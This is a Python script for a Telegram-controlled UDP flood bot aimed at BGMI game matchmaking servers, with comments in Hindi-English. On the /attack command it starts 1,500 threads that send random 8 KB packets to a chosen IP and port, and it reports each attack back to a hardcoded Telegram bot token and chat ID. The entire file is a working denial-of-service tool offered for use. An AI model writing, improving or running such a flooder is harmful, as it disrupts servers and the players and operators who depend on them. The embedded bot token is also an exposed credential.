import os
import socket
import threading
import time
import requests
import random

# ------------------------------------------------------------------
# CONFIGURATION - OPTIMIZED FOR BGMI
# ------------------------------------------------------------------
BOT_TOKEN = "8817277726:AAFH9xmCfWcMOAgQceKee2qJvdCUUcw4v88"   # Apna Token
CHAT_ID   = "8971948454"                          # Apna Chat ID

# SETTINGS
NUM_THREADS = 1500                     # 75+ ports wale error se bachne ke liye thode kam rakhein
PACKET_SIZE = 8192                 # Standard size
TARGET_PORT = 15876                   # Main Matchmaking Port
USE_MULTI_PORT = False                # True karein agar aap range attack karna chahte hain

# Global Variables
stop_event = threading.Event()
active_threads = []
attack_active = False
target_ip_global = ""
current_port = TARGET_PORT

# ------------------------------------------------------------------
# Telegram Functions
# ------------------------------------------------------------------
def send_msg(text):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    payload = {
        "chat_id": CHAT_ID,
        "text": text,
        "parse_mode": "HTML",
        "disable_web_page_preview": True
    }
    try:
        r = requests.post(url, json=payload, timeout=10)
        return r.status_code == 200
    except Exception as e:
        print(f"[!] Send Error: {e}")
        return False

def get_latest_update():
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/getUpdates"
    try:
        r = requests.get(url, timeout=10)
        data = r.json()
        if data['ok']:
            updates = data['result']
            if updates:
                return updates[-1]
    except Exception as e:
        print(f"[!] Get Update Error: {e}")
    return None

# ------------------------------------------------------------------
# UDP Flood Worker (Optimized)
# ------------------------------------------------------------------
def udp_worker(target_ip, target_port):
    try:
        # Socket Create
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        
        # Reuse Address to avoid "Address already in use" errors
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        while not stop_event.is_set():
            payload = os.urandom(PACKET_SIZE)
            try:
                # Sendto with small delay if needed, but usually fast is better for flood
                sock.sendto(payload, (target_ip, target_port))
            except Exception:
                # Agar port bind fail ho ya server reject kare, toh thread break ho jaye
                break
        
        sock.close()
    except Exception:
        pass

# ------------------------------------------------------------------
# Main Attack Logic
# ------------------------------------------------------------------
def start_attack(ip, duration=60, port=None):
    global stop_event, active_threads, attack_active, target_ip_global, current_port

    # Port decide karein
    if USE_MULTI_PORT and port is None:
        # Agar multi-port mode on hai, toh random ports use karein (15876-15900)
        target_port = random.randint(15876, 15900)
    else:
        target_port = port if port else current_port
    
    # Purana attack band karein
    if attack_active:
        print("[*] Stopping previous attack...")
        stop_event.set()
        time.sleep(1)
        stop_event.clear()
    
    target_ip_global = ip
    current_port = target_port
    
    mode_text = "Multi-Port" if USE_MULTI_PORT else "Single-Port"
    print(f"[*] Starting {mode_text} UDP Flood on {ip}:{target_port} for {duration}s...")
    attack_active = True

    # Threads start karein
    active_threads = [] 
    
    for i in range(NUM_THREADS):
        t = threading.Thread(target=udp_worker, args=(ip, target_port), daemon=True)
        active_threads.append(t)
        t.start()

    send_msg(
        f"<b>🚀 BGMI UDP FLOOD ({mode_text})!</b>\n"
        f"Target: <code>{ip}:{target_port}</code>\n"
        f"Method: UDP Flood\n"
        f"Threads: <code>{NUM_THREADS}</code>\n"
        f"Duration: <code>{duration}s</code>"
    )

    # Auto Stop
    def auto_stop():
        time.sleep(duration)
        if attack_active:
            stop_attack()

    threading.Thread(target=auto_stop, daemon=True).start()

def stop_attack():
    global stop_event, active_threads, attack_active

    if not stop_event.is_set():
        print("[*] Stopping attack...")
        stop_event.set()

        for t in active_threads:
            t.join(timeout=2)

        active_threads = []
        attack_active = False
        send_msg("<b>✅ Attack Stopped!</b>")
    else:
        send_msg("⚠️ No active attack to stop.")

def main_loop():
    print(f"[*] BGMI UDP Flood Bot is Running...")

    send_msg(
        f"<b>🎮 BGMI UDP Flood Bot</b>\n\n"
        f"Commands:\n"
        f"<code>/attack IP PORT DURATION</code>\n"
        f"<code>/stop</code>\n"
        f"<code>//status</code>"
    )

    while True:
        try:
            update = get_latest_update()

            if update:
                message = update.get('message', {})
                text = message.get('text', '').strip()

                chat_id_msg = message.get('chat', {}).get('id')
                if str(chat_id_msg) != str(CHAT_ID):
                    continue

                print(f"[+] Command: {text}")

                if text == "/start":
                    send_msg(
                        f"<b>🎮 BGMI UDP Flood Bot</b>\n\n"
                        f"Commands:\n"
                        f"<code>/attack IP PORT DURATION</code>\n"
                        f"<code>/stop</code>\n"
                        f"<code>/status</code>"
                    )

                elif text.startswith("/attack"):
                    parts = text.split()
                    if len(parts) >= 2:
                        ip = parts[1]
                        port = int(parts[2]) if len(parts) > 2 else None
                        duration = int(parts[3]) if len(parts) > 3 else 60
                        
                        try:
                            start_attack(ip, duration, port)
                        except ValueError:
                            send_msg("❌ Invalid format. Use: /attack IP PORT DURATION")
                    else:
                        send_msg("❌ Usage: /attack [IP] [PORT] [DURATION]")

                elif text == "/stop":
                    stop_attack()

                elif text == "//status":
                    status = "Active" if attack_active else "Idle"
                    count = len(active_threads)
                    send_msg(f"✅ Status: {status}\nThreads Running: {count}\nTarget Port: {current_port}")

            time.sleep(2)

        except KeyboardInterrupt:
            print("\n[!] Stopping Bot...")
            stop_attack()
            break
        except Exception as e:
            print(f"[!] Error: {e}")
            time.sleep(2)

if __name__ == "__main__":
    main_loop()
